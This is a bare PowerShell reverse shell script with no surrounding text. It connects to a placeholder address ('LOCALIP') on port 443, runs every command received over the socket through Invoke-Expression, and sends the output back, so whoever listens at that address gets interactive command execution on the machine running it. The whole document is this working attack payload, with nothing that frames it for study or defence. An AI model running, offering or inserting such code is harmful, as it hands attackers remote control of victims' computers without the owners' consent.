$client = New-Object System.Net.Sockets.TCPClient("LOCALIP",443);

$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|foreach-object{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $callBack = (Invoke-Expression $data 2>&1 | Out-String );
    $callBack2 = $callBack + "# ";
    $sendBytes = ([text.encoding]::ASCII).GetBytes($callBack2);
    $stream.Write($sendBytes,0,$sendBytes.Length);$stream.Flush()
}
$client.close()
